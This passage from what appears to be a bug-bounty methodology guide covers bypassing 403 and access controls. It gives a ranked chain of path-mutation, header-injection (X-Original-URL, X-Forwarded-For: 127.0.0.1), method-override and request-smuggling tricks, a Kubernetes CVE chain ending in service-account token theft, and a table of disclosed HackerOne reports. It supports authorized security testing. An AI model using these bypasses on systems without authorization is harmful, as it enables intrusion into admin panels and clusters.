15. K8s ingress CVE-2024-7646 annotation bypass → Lua exec → read service account token → full cluster
```

---

## Fallback Chain (Decision Tree)

1. **Path mutations** — trailing slash, `..;/`, double slash, extension append, dontgo403/byp4xx full matrix
2. **Header injection** — `X-Original-URL: /admin`, `X-Forwarded-For: 127.0.0.1`, `X-Rewrite-URL: /admin`
3. **Method override** — POST instead of GET, `X-HTTP-Method-Override`, PROPFIND/DEBUG/TRACE
4. **HTTP version tricks** — HTTP/1.0 without Host, h2c smuggling, H2 pseudo-header manipulation
5. **Protocol bypass** — CL.TE / TE.CL request smuggling, WebSocket upgrade
6. **Framework-specific CVEs** — check target tech stack vs CVE list above
7. **API versioning** — `/api/v0/`, `/api/v2/`, `/api/beta/` variants
8. **Redirect intercept** — intercept 302 in Burp, read body with admin content
9. **Adjacent paths** — `/api/v1/admin` blocked but `/api/v2/admin` open; GraphQL exposing same admin data
10. **Subdomain recon** — `admin-staging.target.com`, `internal.target.com` may lack WAF rules

Never stop because one technique failed — always pivot to the next vector.

---

## Real-World Reports (HackerOne Disclosed + Writeups)

**PROVEN techniques (≥3 confirmed reports):**

| Report | Program | Technique | Bounty |
|---|---|---|---|
| H1 #838635 | LY Corporation | Spring Actuator `/heapdump` — 403 only on root, sub-paths exposed → JWT key → admin | $12,500 |
| H1 #862589 | LY Corporation | Spring Actuator public access → broken auth chain | $5,000 |
| H1 #1591412 | GitLab | Path traversal variant on `{group}.gitlab.io/-/path` IP allowlist bypass | $3,990 |
| H1 #737323 | Clario | `X-Rewrite-URL: /admin` bypasses front Nginx restrictions | Undisclosed |
| H1 #1224089 | Acronis | IP restriction bypass via `X-Forwarded-For: 127.0.0.1` | Undisclosed |
| H1 #117862 | Mail.ru | `X-Original-URL: /admin/users` → admin panel bypass | $500 |
| H1 #683957 | Mail.ru | Stop redirect on `/admin/*` → admin upload → webshell | Undisclosed |
| H1 #736273 | Razer | Block redirect → admin panel content exposed | $1,000 |
| H1 #1490470 | UPS VDP | Auth bypass → admin ATO | Undisclosed |
| H1 #1709881 | MTN | Auth bypass → complete ATO | Undisclosed |
| H1 #136169 | Uber | OneLogin auth bypass on WordPress | $10,000 |
| H1 #3027461 | Cloudflare | ACME path WAF bypass → all rules disabled | Critical |
| H1 #1901040 | GitHub | Auth bypass via SSH certificates on gist.github.com | $10,000 |
| Private | AWS API GW | `//api/admin/` trailing-slash Lambda authorizer skip | **$12,000** |
| TE.0 GCP | Google Cloud IAP | TE.0 smuggling bypasses Identity-Aware Proxy | **$8,500** |

**PROVEN technique signals:**
- **Spring Actuator sub-path bypass** via trailing slash / semicolons → `heapdump` / `env` → secrets → admin (LY Corp x2, Acronis, DoD, Semrush)
- **Reverse-proxy header injection** (`X-Forwarded-For`, `X-Original-URL`, `X-Rewrite-URL`) → admin panel (Mail.ru, Clario, Acronis)
- **Stop/block 302 redirect** → admin page body readable (Mail.ru, Razer)
- **Path traversal / double-slash** → bypass IP allowlist or ACL prefix rule (GitLab, AWS API GW)
- **h2c smuggling / HTTP smuggling** → bypasses WAF/auth proxy entirely (Google IAP, Azure WAF)
